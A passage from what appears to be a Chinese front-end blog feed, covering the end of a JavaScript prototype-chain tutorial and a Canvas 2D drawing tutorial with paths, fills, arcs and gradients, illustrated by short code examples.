language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo2</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">//Foo &#123; age: &#x27;unknown&#x27;, hobbies: &#x27;唱、跳、篮球、Rap&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于实例 f 的 __proto__ 指向 Foo 的 prototype ，而Foo的 prototype 与 Foo2 的 prototype 是一个，所以 f 既属于 Foo 又属于 Foo2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f <span class="keyword">instanceof</span> <span class="title class_">Foo</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f <span class="keyword">instanceof</span> <span class="title class_">Foo2</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="5-关于原型重定向问题"><a href="#5-关于原型重定向问题" class="headerlink" title="5. 关于原型重定向问题"></a>5. 关于原型重定向问题</h2><p>先看下面的一个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fun.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">b</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">20</span>;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">a</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">c</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">30</span>;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> my_fun = <span class="keyword">new</span> <span class="title function_">fun</span>();</span><br><span class="line">my_fun.<span class="title function_">b</span>(); <span class="comment">// 0</span></span><br><span class="line">my_fun.<span class="title function_">c</span>(); <span class="comment">// this =&gt; my_fun.a = 30 ; 30</span></span><br></pre></td></tr></table></figure><blockquote><p>结果：0 30</p></blockquote><p><code>my_fun.a</code> 用来设置私有属性</p><p><code>my_fun.__proto__.a</code> 用来设置公有属性</p><p><strong>原型重定向导致的问题:</strong></p><ol><li>自己开辟的堆内存中没有<code>constructor</code>属性，导致类的原型构造函数缺失（解决：自己手动在堆内存中增加<code>constructor</code>属性）</li><li>当原型重定向后，浏览器默认开辟的那个类原型堆内存会被释放掉，如果之前已经存储了一些方法或属性，都会丢失（所以：内置累的原型不允许重定向到自己开辟的堆内存，因为内置类的原型上存在很多属性方法，重定向后都没了，这样是不被允许的；但浏览器对内置类有保护机制）</li><li>当我们需要给类的原型批量设置属性和方法的时候，一般都是让原型重定向到自己创建的对象中</li></ol><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="1-如何准确判断一个变量是数组类型"><a href="#1-如何准确判断一个变量是数组类型" class="headerlink" title="1. 如何准确判断一个变量是数组类型"></a>1. 如何准确判断一个变量是数组类型</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr <span class="keyword">instanceof</span> <span class="title class_">Array</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> arr); <span class="comment">// object 不能用typeof判断一个变量是否是数组类型</span></span><br></pre></td></tr></table></figure><h2 id="2-写一个原型链继承的例子"><a href="#2-写一个原型链继承的例子" class="headerlink" title="2. 写一个原型链继承的例子"></a>2. 写一个原型链继承的例子</h2><p>基础实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动物</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Log</span>(<span class="string">&#x27;animal eat&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//狗</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">bark</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Log</span>(<span class="string">&#x27;dog bark&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Animal</span>()</span><br><span class="line"><span class="comment">//哈士奇</span></span><br><span class="line"><span class="keyword">var</span> hashiqi = <span class="keyword">new</span> <span class="title class_">Dog</span>()</span><br><span class="line"><span class="comment">//接下里代码演示时，会推荐更加贴近实战的原型继承示例！</span></span><br></pre></td></tr></table></figure><p>封装DOM查询：<a href="../../原型链/06_原型链操作的高级实例.html">戳我查看完整示例代码</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Elem</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">elem</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Elem</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">html</span> = <span class="keyword">function</span> (<span class="params">html</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (html == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">elem</span>.<span class="property">innerHTML</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">elem</span>.<span class="property">innerHTML</span> = html;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>; <span class="comment">// 返回this，便于链式操作</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Elem</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">on</span> = <span class="keyword">function</span> (<span class="params">eventType, fn</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (eventType != <span class="literal">null</span> &amp;&amp; fn != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">elem</span>.<span class="title function_">addEventListener</span>(eventType, fn);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;请传入“事件类型”，“执行方法”！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="keyword">new</span> <span class="title class_">Elem</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(div.<span class="title function_">html</span>());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="3-描述new一个对象的过程"><a href="#3-描述new一个对象的过程" class="headerlink" title="3. 描述new一个对象的过程"></a>3. 描述new一个对象的过程</h2><ul><li>创建一个新对象</li><li>对新对象执行 [[prototype]] 连接</li><li>this 指向这个新对象</li><li>执行代码，即对this 赋值</li><li>返回 this (这一步是默认的)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canvas快速使用教程</title>
      <link href="/2019/05/128690296586.html"/>
      <url>/2019/05/128690296586.html</url>
      
        <content type="html"><![CDATA[<h1 id="Canvas概述"><a href="#Canvas概述" class="headerlink" title="Canvas概述"></a>Canvas概述</h1><h2 id="1-与Flas的区别"><a href="#1-与Flas的区别" class="headerlink" title="1. 与Flas的区别"></a>1. 与Flas的区别</h2><p>Canvas 和Flash的思路完全不一样，Flash是上屏幕之后还是对象，编程语言叫做 Action Script 也是ECMAScript范畴。Canvas上屏幕之后像素化了，再也不能得到这个对象了，所以要想让这个元素运动，必须擦除整个屏幕、重绘这个元素。Canvas更流畅，手机端也嗷嗷流畅。</p><h2 id="2-创建Canvas画布标签"><a href="#2-创建Canvas画布标签" class="headerlink" title="2. 创建Canvas画布标签"></a>2. 创建Canvas画布标签</h2><p>显示默认提醒消息：如果浏览器不支持Canvas，Canvas会被默认渲染为普通标签显示文字</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">width</span>=<span class="string">&quot;200px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200px&quot;</span>&gt;</span>对不起您的浏览器不支持画布！<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：Canvas有一个默认宽高，大概为<code>300 x 150</code>，如果我们用CSS样式去设置Canvas的宽高，会导致画布扭曲，必须在Canvas标签内部，以属性的方式去添加宽高值。</p><h2 id="3-用Javascript操作2D画布"><a href="#3-用Javascript操作2D画布" class="headerlink" title="3. 用Javascript操作2D画布"></a>3. 用Javascript操作2D画布</h2><p>首先要获取到画布对象：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;myCanvas&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500px&quot;</span>&gt;</span>对不起您的浏览器不支持画布！<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> myCanvas = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#myCanvas&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取到画布后，使用画布对象上的 <code>.getContext()</code> 方法新建一个画布</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置上下文，就相当于打开ps之后让你新建画布</span></span><br><span class="line"><span class="keyword">var</span> ctx = myCanvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br></pre></td></tr></table></figure><p>之后就可以对画布进行详细的样式操作（要在绘制动作前设置样式），如设置背景颜色：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="property">fillStyle</span> = <span class="string">&quot;pink&quot;</span></span><br></pre></td></tr></table></figure><p>设置完样式之后就可以进行绘制操作，如绘制成一个矩形（Rect）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">fillRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">300</span>, <span class="number">200</span>)</span><br><span class="line"><span class="comment">// fillRect方法中的参数为设置绘制点的坐标，单位为px</span></span><br></pre></td></tr></table></figure><h2 id="4-API"><a href="#4-API" class="headerlink" title="4. API"></a>4. API</h2><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fillRect(a, b, c, d) 绘制一个填充矩形，abcd分别为四个坐标</span><br></pre></td></tr></table></figure><p>属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fillStyle 设置填充颜色；</span><br></pre></td></tr></table></figure><h1 id="笔触、填充"><a href="#笔触、填充" class="headerlink" title="笔触、填充"></a>笔触、填充</h1><h2 id="1-简述"><a href="#1-简述" class="headerlink" title="1. 简述"></a>1. 简述</h2><p>笔触也叫作“描边”，Canvas中的任何形状都是由这两个部分组成的。</p><p>笔触在canvas中视为一个“Path”的实例，必须stroke之后才能上屏幕；填充用fill才能上屏幕。</p><h2 id="3-绘制路径"><a href="#3-绘制路径" class="headerlink" title="3. 绘制路径"></a>3. 绘制路径</h2><p>使用 <code>beginPath()</code> 代表开始绘制；<code>moveTo(x, y)</code> 代表将笔触移动到某一坐标；<code>lineTo(x, y)</code> 代表直线绘制到某一点；使用 <code>stroke()</code> 能将绘制的图像显示出来。</p><p>如下可以绘制出一条折线：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">ctx.<span class="title function_">moveTo</span>(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">600</span>, <span class="number">300</span>);</span><br><span class="line">ctx.<span class="title function_">stroke</span>();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lpbjrdg2j20es086q2s.jpg" alt=""></p><p>使用 <code>closePath()</code> 可以将最后一个绘制点【该绘制点是被用<code>moveTo(x, y)</code>打断绘制前的那个点】与第一个绘制点连接：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">  ctx.<span class="title function_">moveTo</span>(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">  ctx.<span class="title function_">lineTo</span>(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">  ctx.<span class="title function_">lineTo</span>(<span class="number">600</span>, <span class="number">300</span>);</span><br><span class="line">+ ctx.<span class="title function_">closePath</span>();</span><br><span class="line">  ctx.<span class="title function_">stroke</span>();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lpe43stnj20eq07jjr9.jpg" alt=""></p><p>连续使用 <code>moveTo()</code> 可以让开始新的绘制点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">ctx.<span class="title function_">moveTo</span>(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">600</span>, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">ctx.<span class="title function_">moveTo</span>(<span class="number">600</span>, <span class="number">400</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">700</span>, <span class="number">400</span>);</span><br><span class="line">ctx.<span class="title function_">stroke</span>();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lpg9p7m3j20h009dwed.jpg" alt=""></p><h2 id="4-绘制样式"><a href="#4-绘制样式" class="headerlink" title="4. 绘制样式"></a>4. 绘制样式</h2><p>在绘制前可以对绘制的线段进行样式设置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="property">lineWidth</span> = <span class="string">&quot;10&quot;</span>;</span><br><span class="line">ctx.<span class="property">strokeStyle</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">... ...</span><br><span class="line">ctx.<span class="title function_">stock</span>();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lpw1q9aqj20hk0a9a9y.jpg" alt=""></p><p>在绘制之后，使用 <code>fill()</code> 可以填充封闭图像（如果没有封闭也会自动封闭）的颜色，设置 <code>fillStyle</code> 属性可以来设置填充颜色：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">ctx.<span class="title function_">stock</span>();</span><br><span class="line">ctx.<span class="property">fillStyle</span> = <span class="string">&quot;skyblue&quot;</span></span><br><span class="line">ctx.<span class="title function_">fill</span>();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lq0n8juzj20hh09wmx4.jpg" alt=""></p><p>使用了 <code>fill()</code> 之后，Canvas会自动认为之前的绘制操已经绘制了一个独立的图形。</p><h2 id="6-快速绘制"><a href="#6-快速绘制" class="headerlink" title="6. 快速绘制"></a>6. 快速绘制</h2><p><code>strokeReact(x, y, w, h)</code>快速绘制一个矩形</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="property">fillStyle</span> = <span class="string">&quot;lightseagreen&quot;</span></span><br><span class="line">ctx.<span class="title function_">strokeReact</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">300</span>, <span class="number">200</span>);</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lqaiu2eoj20b706xt8j.jpg" alt=""></p><p>filRecto是一个快捷方法，让你省略了beginPath、move To、lineTo。所以fillRect（100，100，300，200）等价于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">move</span>(<span class="number">100</span>，<span class="number">100</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">400</span>，<span class="number">100</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">400</span>，<span class="number">300</span>);</span><br><span class="line">ctx.<span class="title function_">lineTo</span>(<span class="number">100</span>，<span class="number">300</span>);</span><br><span class="line">ctx.<span class="property">closePath</span>（);</span><br><span class="line">ctx.<span class="title function_">fill</span>();</span><br></pre></td></tr></table></figure><h2 id="6-绘制复杂图像"><a href="#6-绘制复杂图像" class="headerlink" title="6. 绘制复杂图像"></a>6. 绘制复杂图像</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="number">500</span>; i += <span class="number">10</span>) &#123;</span><br><span class="line">  ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">  ctx.<span class="title function_">moveTo</span>(i, i);</span><br><span class="line">  ctx.<span class="title function_">lineTo</span>(i + <span class="number">200</span>, i);</span><br><span class="line">  ctx.<span class="title function_">lineTo</span>(i, i + <span class="number">300</span>);</span><br><span class="line">  ctx.<span class="title function_">closePath</span>();</span><br><span class="line">  ctx.<span class="title function_">stroke</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lqfwcsqoj20js0edmxi.jpg" alt=""></p><h2 id="7-API"><a href="#7-API" class="headerlink" title="7. API"></a>7. API</h2><p>方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beginPath() 代表开始绘制</span><br><span class="line"></span><br><span class="line">moveTo(x, y) 代表将笔触移动到某一坐标</span><br><span class="line"></span><br><span class="line">lineTo(x, y) 代表直线绘制到某一点</span><br><span class="line"></span><br><span class="line">stroke() 能将绘制的图像显示出来</span><br><span class="line"></span><br><span class="line">fill() 可以填充封闭图像</span><br></pre></td></tr></table></figure><p>属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lineWidth 设置绘制线的宽度</span><br><span class="line"></span><br><span class="line">strokeStyle 设置绘制线的颜色样式</span><br><span class="line"></span><br><span class="line">fillStyle 设置填充色的样式</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lpnbvtz1j20ny0budhr.jpg" alt=""></p><h1 id="弧"><a href="#弧" class="headerlink" title="弧"></a>弧</h1><h2 id="1-绘制弧线"><a href="#1-绘制弧线" class="headerlink" title="1. 绘制弧线"></a>1. 绘制弧线</h2><p>使用 <code>arc(x, y, r, startRad, endRad, bollen)</code> 绘制弧线，arc属于笔触，需要使用<code>beginPath()</code>和<code>stroke()</code>来设置开始与绘制动作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">ctx.<span class="title function_">arc</span>(<span class="number">200</span>, <span class="number">200</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">true</span>);</span><br><span class="line">ctx.<span class="title function_">stroke</span>();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2ly5tu2fnj20bj08jjrg.jpg" alt=""></p><p>整圆就是 <code>ctx.arc(200, 200, 100, 0, Math.PI*2, true);</code></p><p>绘制笑脸的方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;myCanvas&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500px&quot;</span>&gt;</span>对不起您的浏览器不支持画布！<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 得到画布</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> myCanvas = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#myCanvas&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 上下文，就相当于打开ps之后让你新建画布</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> ctx = myCanvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 开始绘制路径</span></span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">beginPath</span>();</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">arc</span>(<span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">0</span>, <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">stroke</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">beginPath</span>();</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">arc</span>(<span class="number">90</span>, <span class="number">140</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">stroke</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">beginPath</span>();</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">arc</span>(<span class="number">300</span>, <span class="number">140</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">stroke</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">beginPath</span>();</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">arc</span>(<span class="number">200</span>, <span class="number">200</span>, <span class="number">100</span>, <span class="number">0.6</span>, <span class="number">2.5</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">  ctx.<span class="title function_">stroke</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lyb1ahmfj20bc0bt0sz.jpg" alt=""></p><h2 id="2-API"><a href="#2-API" class="headerlink" title="2. API"></a>2. API</h2><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arc(x, y, r, startRad, endRad, bollen) </span><br><span class="line">绘制弧度，xy为圆心坐标，r为绘制半径，startRad为初始角度，endRad为最终角度，bollen设置为true为逆时针绘制false为顺时针绘制</span><br></pre></td></tr></table></figure><h1 id="绘制渐变"><a href="#绘制渐变" class="headerlink" title="绘制渐变"></a>绘制渐变</h1><h2 id="1-创建渐变色"><a href="#1-创建渐变色" class="headerlink" title="1. 创建渐变色"></a>1. 创建渐变色</h2><p>使用 <code>createLinearrGradient(x1, y1, x2, y2)</code> 创建一个渐变对象，用 <code>addColorStop(rate, color)</code> 添加渐变颜色，将画布的 <code>fillStyle</code> 属性设置为这个渐变对象，即可以填充渐变颜色。</p><p>如绘制一个矩形，矩形内的填充色为从<code>blue</code>渐变到<code>red</code></p><figure class="highlight 